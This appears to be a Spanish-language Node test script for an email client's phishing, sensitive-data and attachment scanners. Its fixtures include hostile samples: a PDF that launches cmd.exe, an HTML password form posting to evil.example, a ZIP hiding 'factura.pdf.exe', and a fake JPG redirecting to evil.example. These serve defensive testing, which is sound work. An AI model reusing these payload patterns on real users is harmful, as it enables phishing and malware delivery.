// Pruebas de seguridad, fases 3 y 4: datos sensibles al enviar, respuestas desviadas, llamadas falsas
// y contenido real de los adjuntos. Ejecutar desde la raíz: node apps/gmail/tests/security-phase34.test.mjs
// (Los códigos QR se prueban en el navegador: tests/security.browser.html.)
import { fileURLToPath, pathToFileURL } from 'node:url';
const root=fileURLToPath(new URL('..', import.meta.url)).replace(/[\\/]$/,'');
const {createServer}=await import(pathToFileURL(root+'/node_modules/vite/dist/node/index.js').href);
const mem=()=>{const m=new Map();return{getItem:k=>m.get(k)??null,setItem:(k,v)=>m.set(k,String(v)),removeItem:k=>m.delete(k)}};
globalThis.localStorage=mem();globalThis.sessionStorage=mem();
globalThis.window={emailAgentHost:{config:{apiBaseUrl:'http://x',pairingToken:'t',googleClientId:'x',microsoftClientId:'id'},pageAccount:null},location:{},addEventListener(){}};
const vite=await createServer({root,configFile:root+'/vite.config.ts',server:{middlewareMode:true,hmr:false,ws:false},appType:'custom',logLevel:'error'});
const out=await vite.ssrLoadModule('/src/services/outgoingChecks.ts');
const scan=await vite.ssrLoadModule('@shared/mail/attachment-scan');
const {analyzeMail}=await vite.ssrLoadModule('@shared/mail/mail-insights');
const {senderAuthentication}=await vite.ssrLoadModule('@shared/mail/sender-intel');
let fails=0;const check=(n,ok,i='')=>{if(!ok)fails++;console.log((ok?'OK   ':'FALLO')+' '+n+(ok?'':' -> '+i));};
const texts=w=>w.map(x=>x.text).join(' | ');

console.log('— Fase 4 · Datos sensibles al enviar');
check('Tarjeta válida (Luhn) → aviso',/tarjeta/.test(texts(out.sensitiveData('Mi tarjeta es 4111 1111 1111 1111, gracias'))));
check('Número largo que no es tarjeta → sin aviso',!/tarjeta/.test(texts(out.sensitiveData('Pedido 1234567890123 confirmado'))));
check('Cédula ecuatoriana válida → aviso',/cédula/.test(texts(out.sensitiveData('Mi cédula: 1710034065'))));
check('Diez dígitos que no son cédula → sin aviso',!/cédula/.test(texts(out.sensitiveData('Teléfono 0999999999'))));
check('Contraseña escrita → aviso',/contraseña/.test(texts(out.sensitiveData('Te paso la clave: Hola2026!'))));
check('«La clave es Hola2026!» → aviso',/contraseña/.test(texts(out.sensitiveData('Mi tarjeta es tal y la clave es Hola2026!'))));
check('«La clave es importante» → sin aviso de contraseña',!/contraseña/.test(texts(out.sensitiveData('La clave es importante para el proyecto.'))));
check('Código de verificación → aviso',/código/.test(texts(out.sensitiveData('Mi código de verificación es 482913'))));
check('Cuenta bancaria → aviso',/cuenta bancaria/.test(texts(out.sensitiveData('Deposita en la cuenta de ahorros 2200123456'))));
check('Mensaje normal → sin avisos',out.sensitiveData('Hola, nos vemos el lunes a las 10 para revisar el informe.').length===0);

console.log('\n— Fase 4 · Respuesta a otra organización');
check('Responder a otro dominio → aviso',!!out.replyWarning('pagos@proveedor-falso.com',{sender:'carlos@techpartner.com'}));
check('Responder al mismo dominio → sin aviso',!out.replyWarning('ana@techpartner.com',{sender:'carlos@techpartner.com'}));
check('Subdominio de la misma organización → sin aviso',!out.replyWarning('ana@mail.techpartner.com',{sender:'carlos@techpartner.com'}));

console.log('\n— Fase 3 · Llamadas falsas');
let r=analyzeMail({subject:'Renovación de su suscripción',sender:'factura@gmail.com',senderName:'Soporte',text:'Se le cobró $399 por la renovación de su antivirus. Si no reconoce el cargo, llame al +1 (888) 555-0199 para cancelar.'});
check('Cobro + llame a un número → aviso',r.reasons.some(x=>/llamada de soporte/.test(x)) && r.level!=='none',r.reasons.join(' | '));
r=analyzeMail({subject:'Reunión',sender:'ana@empresa.com',senderName:'Ana',text:'Llámame al 0991234567 cuando puedas para la reunión.'});
check('Llamar por otra cosa → sin aviso',!r.reasons.some(x=>/llamada de soporte/.test(x)),r.reasons.join(' | '));
const bank=senderAuthentication([{name:'Authentication-Results',value:'mx.google.com; dkim=pass header.i=@pichincha.com; spf=pass; dmarc=pass header.from=pichincha.com'}],'n@pichincha.com');
r=analyzeMail({subject:'Débito realizado',sender:'n@pichincha.com',senderName:'Banco Pichincha',text:'Se realizó un cargo a tu cuenta. Si no lo reconoces, llama al 02 299 9999.',auth:bank});
check('Banco verificado con teléfono → solo nota',!r.reasons.some(x=>/llamada de soporte/.test(x)) && r.notes.some(x=>/teléfono/.test(x)),r.reasons.join(' | '));

console.log('\n— Falsos positivos de enlaces');
const {checkLink}=await vite.ssrLoadModule('@shared/mail/mail-insights');
const warn=c=>c.findings.filter(x=>x.weight>0).map(x=>x.reason).join(' | ');
let c=checkLink('https://links.email.claude.com/x','permissions.blockWritesOutsideWorkingDirectories');
check('Nombre de ajuste con puntos → no se toma como sitio web',!/El texto muestra/.test(warn(c)),warn(c));
c=checkLink('https://links.email.claude.com/x','config.json');
check('Nombre de archivo → no se toma como sitio web',!/El texto muestra/.test(warn(c)),warn(c));
c=checkLink('https://data.a.santanderopenacademy.com/x','www.santanderopenacademy.com,,');
check('Comas tras la dirección → mismo sitio, sin aviso',!/El texto muestra/.test(warn(c)),warn(c));
c=checkLink('https://evil.github.io/login','mibanco.github.io');
check('Hosting compartido: otro sitio de github.io no es el mismo',/El texto muestra/.test(warn(c)),warn(c));
c=checkLink('https://evil.example/login','www.mibanco.com.');
check('Punto final no oculta un destino distinto',/El texto muestra www\.mibanco\.com,/.test(warn(c)),warn(c));
c=checkLink('https://evil.example/login','mibanco.ec');
check('Dominio de país (.ec) sin www → se sigue revisando',/El texto muestra mibanco\.ec/.test(warn(c)),warn(c));
c=checkLink('https://c.gle/abc','santanderopenacademy.com',{senderDomain:'accounts.google.com',verified:true});
check('Enlace corto propio de Google desde Google verificado → solo nota',!warn(c) && c.findings.some(x=>/servicio propio/.test(x.reason)),JSON.stringify(c.findings));
c=checkLink('https://c.gle/abc','santanderopenacademy.com',{senderDomain:'google-alertas.com',verified:true});
check('…pero no si el remitente no es Google',/El texto muestra/.test(warn(c)),warn(c));

console.log('\n— Dominios de Microsoft por país y correos propios');
{
  const intel=await vite.ssrLoadModule('@shared/mail/sender-intel');
  const insightsMod=await vite.ssrLoadModule('@shared/mail/mail-insights');
  const brands=intel.KNOWN_BRANDS.flatMap(b=>b.domains.map(domain=>({domain,label:b.name})));
  for(const d of ['outlook.es','hotmail.co.uk','live.com.mx','outlook.com.ar','hotmail.es'])
    check(`${d} es de Microsoft → no es una imitación`,intel.findLookalike(d,brands)===null,JSON.stringify(intel.findLookalike(d,brands)));
  check('outlook-soporte.com sigue siendo una imitación',intel.findLookalike('outlook-soporte.com',brands)?.label==='Microsoft');
  check('micros0ft.com sigue siendo una imitación',intel.findLookalike('micros0ft.com',brands)?.label==='Microsoft');
  check('Otro sitio bajo com.tr no pasa por Microsoft',intel.findLookalike('evil-bank.com.tr',brands)===null && !intel.sameOrganization('evil.com.tr','outlook.com.tr'));
  const r=insightsMod.analyzeMail({subject:'¿Qué es NexoMail?',sender:'perezchq111@outlook.es',senderName:'Jonathan Pérez',text:'Hola, te cuento qué es NexoMail.'});
  check('Un correo normal desde outlook.es no da «imita a Microsoft»',!r.reasons.some(x=>/imita a Microsoft/.test(x)),r.reasons.join(' | '));
  const risky=insightsMod.analyzeMail({subject:'Datos',sender:'yo@outlook.es',senderName:'Yo',text:'Tarjeta 4111 1111 1111 1111. Ingresa tu contraseña aquí para verificar tu cuenta.'});
  const own=insightsMod.ownMessageInsights(risky);
  check('Un correo que enviaste tú no lleva avisos de fraude',own.level==='none' && own.reasons.length===0 && /Lo enviaste tú/.test(own.notes[0]),JSON.stringify(own).slice(0,160));
}

console.log('\n— Fase 3 · Contenido real de los adjuntos');
const enc=new TextEncoder();
const bytes=(...parts)=>{const arr=parts.flatMap(p=>typeof p==='string'?[...enc.encode(p)]:p);return new Uint8Array(arr);};
const reasons=f=>f.map(x=>x.reason).join(' | ');
let f=scan.scanAttachment('factura.pdf',bytes([0x4d,0x5a,0x90,0],'This program cannot be run in DOS mode'));
check('«factura.pdf» que es un programa → peligroso',f.some(x=>x.weight>=4 && /programa de Windows/.test(x.reason)),reasons(f));
f=scan.scanAttachment('factura.pdf',bytes('%PDF-1.7\n1 0 obj << /Type /Catalog >> endobj'));
check('PDF normal → sin avisos',f.length===0,reasons(f));
f=scan.scanAttachment('documento.pdf',bytes('%PDF-1.4\n<< /OpenAction << /S /Launch /F (cmd.exe) >> >>'));
check('PDF que lanza programas → peligroso',f.some(x=>x.weight>=4),reasons(f));
f=scan.scanAttachment('Factura_Banco.html',bytes('<html><body><form action="https://evil.example/x"><input type="email"><input type="password"></form></body></html>'));
check('HTML con formulario de contraseña → peligroso',f.some(x=>x.weight>=4 && /inicio de sesión falsa/.test(x.reason)),reasons(f));
// ZIP: central directory entry for «factura.exe» (and an encrypted one)
const central=(name,flags)=>{const n=[...enc.encode(name)];const h=new Array(46).fill(0);h[0]=0x50;h[1]=0x4b;h[2]=1;h[3]=2;h[8]=flags;h[28]=n.length;return [...h,...n];};
const zip=(...entries)=>bytes([0x50,0x4b,0x03,0x04,0,0,0,0],...entries);
f=scan.scanAttachment('documentos.zip',zip(central('factura.pdf.exe',0)));
check('ZIP con un programa dentro → peligroso',f.some(x=>x.weight>=4 && /factura\.pdf\.exe/.test(x.reason)),reasons(f));
f=scan.scanAttachment('documentos.zip',zip(central('factura.pdf',1)),'Adjunto la factura. La contraseña del archivo es 1234.');
check('ZIP cifrado con la contraseña en el correo → peligroso',f.some(x=>x.weight>=4 && /contraseña viene en el correo/.test(x.reason)),reasons(f));
f=scan.scanAttachment('documentos.zip',zip(central('factura.pdf',1)),'Adjunto la factura.');
check('ZIP cifrado sin contraseña en el correo → para revisar',f.some(x=>x.weight===2) && !f.some(x=>x.weight>=4),reasons(f));
f=scan.scanAttachment('informe.docx',zip(central('word/document.xml',0),central('word/vbaProject.bin',0)));
check('Word con macros → aviso',f.some(x=>/macros/.test(x.reason)),reasons(f));
f=scan.scanAttachment('informe.docx',zip(central('word/document.xml',0)));
check('Word normal → sin avisos',f.length===0,reasons(f));
f=scan.scanAttachment('foto.jpg',bytes([0xff,0xd8,0xff,0xe0,0,0x10],'JFIF'));
check('Imagen real → sin avisos',f.length===0,reasons(f));
f=scan.scanAttachment('foto.jpg',bytes('<html><script>window.location="https://evil.example"</script></html>'));
check('«foto.jpg» que es una página web → aviso',f.some(x=>/página web/.test(x.reason)),reasons(f));

console.log(fails?`\nHAY FALLOS (${fails})`:'\nTODO OK');
await vite.close();
process.exitCode=fails?1:0;
